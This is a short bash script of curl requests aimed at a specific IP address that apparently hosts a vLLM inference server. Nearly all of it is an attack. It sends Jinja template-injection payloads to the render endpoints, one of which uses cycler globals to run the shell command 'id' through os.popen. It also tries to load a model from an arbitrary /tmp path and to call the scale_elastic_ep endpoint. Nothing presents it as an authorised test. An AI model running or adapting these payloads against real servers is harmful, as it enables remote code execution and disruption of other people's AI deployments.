#!/bin/bash
B=http://123.184.7.135:8000
J='-H Content-Type:application/json'
echo "=== render plain"
curl -s -m 15 -o /tmp/a -w 'r1 %{http_code} ' -X POST $J -d '{"model":"m","messages":[{"role":"user","content":"hello {{7*7}}"}]}' "$B/v1/chat/completions/render"; head -c 300 /tmp/a; echo
echo "=== render with chat_template param"
curl -s -m 15 -o /tmp/a -w 'r2 %{http_code} ' -X POST $J -d '{"model":"m","messages":[{"role":"user","content":"hello"}],"chat_template":"{{7*7}} {{cycler.__init__.__globals__.os.popen(\"id\").read()}}"}' "$B/v1/chat/completions/render"; head -c 400 /tmp/a; echo
echo "=== completions/render"
curl -s -m 15 -o /tmp/a -w 'r3 %{http_code} ' -X POST $J -d '{"model":"m","prompt":"{{7*7}}","chat_template":"{{7*7}}"}' "$B/v1/completions/render"; head -c 300 /tmp/a; echo
echo "=== tokenize"
curl -s -m 15 -o /tmp/a -w 't %{http_code} ' -X POST $J -d '{"model":"m","prompt":"{{7*7}}"}' "$B/tokenize"; head -c 200 /tmp/a; echo
echo "=== load"
curl -s -m 15 -o /tmp/a -w 'loadGET %{http_code} ' "$B/load"; head -c 300 /tmp/a; echo
curl -s -m 25 -o /tmp/a -w 'loadPOST %{http_code} ' -X POST $J -d '{"model_name":"/tmp/ul5685","model":"/tmp/ul5685","url":"/tmp/ul5685","path":"/tmp/ul5685"}' "$B/load"; head -c 300 /tmp/a; echo
echo "=== version/ping"
curl -s -m 10 -o /tmp/a -w 'ver %{http_code} ' "$B/version"; head -c 200 /tmp/a; echo
curl -s -m 10 -o /tmp/a -w 'ping %{http_code} ' "$B/ping"; head -c 120 /tmp/a; echo
echo "=== metrics model info"
curl -s -m 10 "$B/metrics" | grep -iE 'model_name|vllm:info|gpu_cache|num_gpu' | head -8
echo "=== scale_elastic_ep attempt"
curl -s -m 30 -o /tmp/a -w 'scale %{http_code} ' -X POST $J -d '{"new_data_parallel_size":1}' "$B/scale_elastic_ep"; head -c 300 /tmp/a; echo
echo DONE
